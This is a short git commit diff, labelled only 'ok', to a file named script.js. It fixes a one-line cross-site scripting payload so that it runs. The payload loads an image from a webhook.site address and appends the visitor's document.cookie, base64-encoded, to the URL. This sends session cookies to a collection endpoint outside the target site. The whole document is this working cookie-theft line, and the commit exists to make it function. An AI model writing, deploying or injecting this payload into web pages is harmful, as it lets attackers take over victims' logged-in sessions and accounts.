10b8500cc3fc3b214db16e6434ff2502f332ea76
huyhoangtran00 <huyhoangtran00@gmail.com>
2025-04-14 11:22:43 +0700

    ok

--- script.js
+++ script.js
@@ -1,3 +1,2 @@
 
-x = new Image(); x.src = 'https://webhook.site/162aa37b-de55-4f05-b265-5919a4516028?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/162aa37b-de55-4f05-b265-5919a4516028?data='+btoa(document.cookie);
